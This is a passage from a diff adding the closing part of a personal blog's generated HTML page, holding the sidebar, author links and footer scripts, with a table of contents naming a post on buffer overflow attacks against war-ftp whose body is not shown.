+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#缓冲区溢出攻击和实战war-ftp"><span class="nav-number">1.</span> <span class="nav-text">缓冲区溢出攻击和实战war-ftp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">1.2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是缓冲区溢出"><span class="nav-number">1.2.1.</span> <span class="nav-text">什么是缓冲区溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何利用缓冲区溢出"><span class="nav-number">1.2.2.</span> <span class="nav-text">如何利用缓冲区溢出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实战"><span class="nav-number">1.3.</span> <span class="nav-text">实战</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BMooS"
+      src="https://s2.ax1x.com/2020/01/15/lOIrB4.jpg">
+  <p class="site-author-name" itemprop="name">BMooS</p>
+  <div class="site-description" itemprop="description">BMooS的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/BMooS" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BMooS" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:slibo921@gmail.com" title="E-Mail → mailto:slibo921@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://lyuan.co/" title="https:&#x2F;&#x2F;lyuan.co&#x2F;" rel="noopener" target="_blank">霹雳无敌我大哥</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://ftosims.github.io/" title="https:&#x2F;&#x2F;ftosims.github.io&#x2F;" rel="noopener" target="_blank">宇宙洪荒我烺神</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BMooS</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">110k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:40</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.6' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
